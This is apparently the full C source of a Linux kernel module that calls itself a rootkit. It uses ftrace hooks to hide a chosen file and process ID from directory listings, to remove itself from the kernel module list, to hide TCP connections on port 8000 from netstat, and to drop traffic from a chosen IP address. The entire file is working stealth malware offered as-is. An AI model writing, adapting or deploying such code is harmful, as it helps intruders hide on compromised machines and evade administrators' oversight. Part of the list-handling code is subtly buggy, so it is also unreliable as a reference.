#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <linux/tcp.h>
#include <linux/ip.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <net/ip.h>
#include <linux/module.h>

#include "ftrace_helper2.h"
#include "helper.h"



/*
hooked functions
*/
static asmlinkage int (*old_getdents64)(const struct pt_regs *regs);
static asmlinkage int new_getdents64(const struct pt_regs *regs);

asmlinkage int (*old_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
 	   struct net_device *orig_dev);
asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
 	   struct net_device *orig_dev);

static asmlinkage int new_m_show(struct seq_file *m, void *p);
static asmlinkage int (*old_m_show)(struct seq_file *m, void *p);

static asmlinkage int (*old_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int new_tcp4_seq_show(struct seq_file *seq, void *v);





char* file_to_hide = NULL;
char* pid_to_hide = NULL;
char* ip_to_block = NULL;

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ROYCO");
MODULE_DESCRIPTION("a linux kernel module rootkit");
MODULE_VERSION("1");

module_param(file_to_hide, charp, 0000);
MODULE_PARM_DESC(file_to_hide, "file to hide from getdents64 syscall- and from ls commands as a result.");

module_param(pid_to_hide, charp, 0000);
MODULE_PARM_DESC(pid_to_hide, "pid to hide from getdents64 syscall- and from ps commands as a result.");


module_param(ip_to_block, charp, 0000);
MODULE_PARM_DESC(ip_to_block, "block ip from incomming traffic to userspace");






static struct ftrace_hook hooks[] = {
 	HOOK("ip_rcv", new_ip_rcv, &old_ip_rcv),
 	HOOK("m_show", new_m_show, &old_m_show),
 	HOOK("__x64_sys_getdents64", new_getdents64, &old_getdents64),
 	HOOK("tcp4_seq_show", new_tcp4_seq_show, &old_tcp4_seq_show),
 };



static int __init rootkit_enter(void) {

	unsigned int err;
	printk(KERN_INFO "combined rootkit: is operating\n");

	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));

	if(err)
		return err;

	printk(KERN_INFO "switched getdents64 syscall to malicious one\n");

	return 0;
}




static void __exit rootkit_exit(void) {

	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit stopped\n");
}


asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
 	   struct net_device *orig_dev){

	int ip;
	struct iphdr* ip_header;
	unsigned int src_ip;
	if (NULL == ip_to_block)
		goto done;
	// check if there is an IP to block.
	ip = ip_str_to_num(ip_to_block);

	ip_header = (struct iphdr *)skb_network_header(skb);
	src_ip = (unsigned int)ip_header->saddr;
	
	if (src_ip == ip)
	{
		printk(KERN_INFO "blocked traffic from %s\n", ip_to_block);
		return NET_RX_DROP;
	}
	done:
		return old_ip_rcv(skb, dev, pt, orig_dev);

}



static asmlinkage int new_m_show(struct seq_file *m, void *p)
{
	struct module *mod = list_entry(p, struct module, list);
	if (strcmp(mod->name, "rootkit") == 0)
	{
		printk(KERN_INFO "not so fast amigo\n");
		seq_puts(m,"");
		return 0;	
	}
	return old_m_show(m, p);
}


static asmlinkage int new_tcp4_seq_show(struct seq_file *seq, void *v)
{
	__u16 srcp;
	const struct inet_sock *inet;
	struct sock *sk = v;
	printk(KERN_INFO "hooked a call to tcp4_seq_show\n");
	if (v == SEQ_START_TOKEN)
		return old_tcp4_seq_show(seq, v);
	inet = inet_sk(sk);
	srcp = ntohs(inet->inet_sport);
	if (srcp == 8000){
		printk(KERN_INFO "netstat_rootkit: identified tcp traffic to port 8000\n");
		seq_puts(seq, "");
		return 0;
	}
	return old_tcp4_seq_show(seq, v);

}

/*
hook the getdents64 syscall to allow hiding of files by name, and of proccesses by PID.
those 2 are effectively the same, but I wanted to support an option where both will be required.
the implementation came out clunky and full of boilerplate- sorry, I need to work on my C skillz -_- 
*/
static asmlinkage int new_getdents64(const struct pt_regs *regs)
{
	struct linux_dirent64 *dirent_kern, *dirent, *curr_ent, *prev_ent = NULL; 
	unsigned int len;
	unsigned long index = 0;
	long error;


	unsigned short hide_pid = 1, hide_file = 1; // should we attempt to hide a file/pid ?


	dirent = (struct linux_dirent64*)(regs->si); // struct from userspace
	len = old_getdents64(regs); // here struct gets populated by syscall

	// check if we even need to hide files- did the user pass the either file_to_hide or pid_to_hide ?

	if (NULL == file_to_hide) 
	{
        hide_file = 0;   
	}
	if (NULL == pid_to_hide)
	{
		hide_pid = 0;
	}
	if (!hide_file && !hide_pid)
	{
		return len;
	}

	dirent_kern = kzalloc(len, GFP_KERNEL); 


	if(dirent_kern <=0 || (dirent_kern == NULL))
		return len;

	error = copy_from_user(dirent_kern, dirent, len); //copy the struct to kernel buffer.
	if (error)
		goto done;
	

	curr_ent = (void*)dirent_kern + index;
	prev_ent = curr_ent;

	while (index < len)
	{
		prev_ent = curr_ent;
		curr_ent = (void*)dirent_kern + index;
		if (hide_file)
		{
			if (strcmp(file_to_hide, curr_ent->d_name) == 0){
				if (index == 0 )// special case
				{
					len -= curr_ent->d_reclen;
					memmove(curr_ent, curr_ent+curr_ent->d_reclen, len);
				}
				else
				{
					prev_ent->d_reclen += curr_ent->d_reclen;
				}
			}
		}
		if (hide_pid)
		{
			if (strcmp(pid_to_hide, curr_ent->d_name) == 0){
				if (index == 0 )// special case
				{
					len -= curr_ent->d_reclen;
					memmove(curr_ent, curr_ent+curr_ent->d_reclen, len);
				}
				else
				{
					prev_ent->d_reclen += curr_ent->d_reclen;
				}
			}
		}
		index += curr_ent->d_reclen;
	}

		
	error = copy_to_user(dirent, dirent_kern, len);
	if (error)
		goto done;	

	done:
		kfree(dirent_kern);
		return len;
	
	
}


module_init(rootkit_enter);
module_exit(rootkit_exit);
